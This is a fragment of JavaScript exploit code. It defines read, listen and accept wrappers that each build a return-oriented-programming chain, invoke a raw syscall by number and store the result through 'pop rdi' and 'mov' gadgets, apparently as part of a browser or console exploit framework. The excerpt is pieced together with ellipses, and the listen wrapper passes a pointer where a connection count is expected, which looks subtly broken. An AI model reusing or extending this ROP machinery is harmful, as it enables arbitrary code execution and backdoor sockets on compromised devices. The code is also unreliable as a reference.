...
function read(fd, addr, len) {
    var r = new RopChain()
    var ret = storage.alloc(0x4)
    r.syscall(3, fd, addr, len);
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
...
function listen(fd, max_conn) {
    var max_conn_addr = storage.alloc(0x4)
    write32(max_conn_addr, max_conn)

    var r = new RopChain()
    var ret = storage.alloc(0x4)
    r.syscall(106, fd, max_conn_addr);
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
...
function accept(fd, data_addr, len_addr) {
    var r = new RopChain()
    var ret = storage.alloc(0x4)
    r.syscall(30, fd, data_addr, len_addr);
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
